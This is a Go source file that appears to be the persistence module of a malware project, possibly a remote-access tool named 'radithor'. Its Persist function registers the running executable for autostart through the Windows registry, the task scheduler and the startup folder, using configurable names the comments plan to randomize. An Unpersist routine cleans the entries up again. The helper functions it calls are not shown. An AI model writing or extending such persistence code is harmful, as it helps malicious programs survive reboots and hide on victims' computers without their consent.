package persistence

import (
	"radithor/core"
	"radithor/store"

	"shared/config"
)

const ( // the random names needs to be tracked so we can delete them
	_PERSISTENCE_NAME_REG       uint8 = 1
	_PERSISTENCE_NAME_SCHEDULER uint8 = 2
	_PERSISTENCE_NAME_STARTUP   uint8 = 3
)

func Persist(filePath string) {
	if filePath == "" {
		filePath = store.ExecPath
	}

	if config.GetConfigAny[bool](store.REGISTRY) {
		err := AddToRegistry(filePath)
		if err != nil {
			core.LogWarning("[Persist] failed to add to reg - %v", err)
		}
	}

	if config.GetConfigAny[bool](store.TASK_SCHEDULER) {
		err := AddToScheduler(filePath)
		if err != nil {
			core.LogWarning("[Persist] failed to add to scheduler - %v", err)
		}
	}

	if config.GetConfigAny[bool](store.STARTUP_FOLDER) {
		err := AddToStartupFolder(filePath)
		if err != nil {
			core.LogWarning("[Persist] failed to add to startup folder - %v", err)
		}
	}
}

func Unpersist() {
	err := RemoveFromRegistry()
	if err != nil {
		core.LogWarning("[Unpersist] failed to remove from reg - %v", err)
	}

	err = RemoveFromScheduler()
	if err != nil {
		core.LogWarning("[Unpersist] failed to remove from scheduler - %v", err)
	}

	err = RemoveFromStartupFolder()
	if err != nil {
		core.LogWarning("[Unpersist] failed to remove from startup folder - %v", err)
	}
}

func getPersistenceName(nameCode uint8) string { // todo, add random persistence name
	return config.GetConfigString(store.PERSISTENCE_NAME)
}
